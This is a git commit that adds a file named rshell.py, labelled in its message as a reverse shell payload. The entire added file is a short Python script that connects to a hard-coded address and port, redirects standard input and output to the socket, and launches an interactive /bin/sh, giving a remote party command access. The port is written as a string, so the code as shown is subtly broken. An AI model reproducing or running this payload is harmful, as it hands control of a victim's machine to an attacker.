1c4fb24ad05558cd55319abb69dadb63b8537144
Muhammad Fasal <mfmbt786@gmail.com>
2021-01-06 20:00:57 +0530

    :sparkles: reverse shell payload

---
+++ rshell.py
@@ -0,0 +1,10 @@
+import subprocess
+import socket
+import os
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.4.5.219","4444"))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p = subprocess.call(["/bin/sh","-i"])
